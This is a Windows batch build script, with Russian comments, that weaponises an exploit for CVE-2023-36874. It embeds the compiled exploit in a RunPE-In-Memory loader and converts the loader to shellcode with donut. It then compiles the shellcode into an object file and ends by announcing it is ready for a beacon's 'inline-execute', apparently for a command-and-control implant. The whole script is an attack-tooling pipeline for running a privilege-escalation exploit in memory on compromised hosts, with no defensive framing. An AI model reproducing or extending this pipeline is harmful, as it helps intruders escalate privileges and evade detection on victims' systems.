@echo off
setlocal

:::DEVELOPER COMMAND PROMPT

:: Переход в директорию с собранным exe и конвертация в C-стильный массив
cd C:\Users\User\Desktop\Projects\CVE-2023-36874
echo Converting CVE-2023-36874 (main.exe) to binary.h...
python convert.py main.exe binary.h

:: Копирование файла binary.h в проект RunPE-In-Memory
echo Copying binary.h to RunPE-In-Memory project...
copy /Y binary.h C:\Users\User\Desktop\Projects\cpp\RunPE-In-Memory\RunPE-In-Memory\RunPEinMemory

:: Переход в директорию проекта RunPE-In-Memory и сборка решения
cd C:\Users\User\Desktop\Projects\cpp\RunPE-In-Memory\RunPE-In-Memory
echo Building RunPE-In-Memory solution...
msbuild RunPEinMemory.sln /p:Configuration=Release /p:Platform="x64"

:: Переход в директорию с собранным RunPEinMemory.exe и использование donut для создания exp.bin
cd C:\Users\User\Desktop\Projects\cpp\RunPE-In-Memory\RunPE-In-Memory\x64\Release
echo Creating exp.bin using donut...
donut -i RunPEinMemory.exe -a 2 -o exp.bin

:: Конвертация exp.bin в exp.c
echo Converting exp.bin to exp.c...
python convert.py exp.bin exp.c

:: Компиляция exp.c в exp.o
echo Compiling exp.c to exp.o...
x86_64-w64-mingw32-gcc -c exp.c -o exp.o


:: Копирование exp.o и exp.c в директорию BOF
echo Copying exp.o and exp.c to BOF directory...
copy /Y exp.o C:\Users\User\Desktop\Projects\CVE-2023-36874\BOF
copy /Y exp.c C:\Users\User\Desktop\Projects\CVE-2023-36874\BOF

echo Ready for beacon use "inline-execute C:\Users\User\Desktop\Projects\CVE-2023-36874\BOF\exp.o"
echo All operations completed.
endlocal